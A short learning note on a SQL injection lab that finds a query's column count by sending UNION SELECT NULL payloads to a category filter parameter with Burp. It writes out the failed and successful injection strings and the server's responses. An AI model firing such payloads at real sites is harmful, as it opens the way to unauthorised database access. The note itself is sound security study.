# Learning Notes

## Topic

Determining Number of Columns using UNION SELECT

---

## Goal

Before extracting data using UNION SELECT, determine how many columns are returned by the original SQL query.

---

## Why?

UNION requires both SELECT statements to return the same number of columns.

Otherwise the database returns an error.

---

## Initial Request

```

GET /filter?category=Corporate+gifts

```

---

## Failed Payload

```

' UNION SELECT NULL,NULL--

```

Returned

```

HTTP/2 500 Internal Server Error

```

---

## Successful Payload

```

' UNION SELECT NULL,NULL,NULL--

```

Returned

```

HTTP/2 200 OK

```

Lab solved.

---

## Key Concepts

- UNION SELECT
- Column Enumeration
- NULL Values
- SQL Error Analysis

---

## Skills Practiced

- Burp Proxy
- Burp Repeater
- SQL Payload Testing
- Manual SQL Injection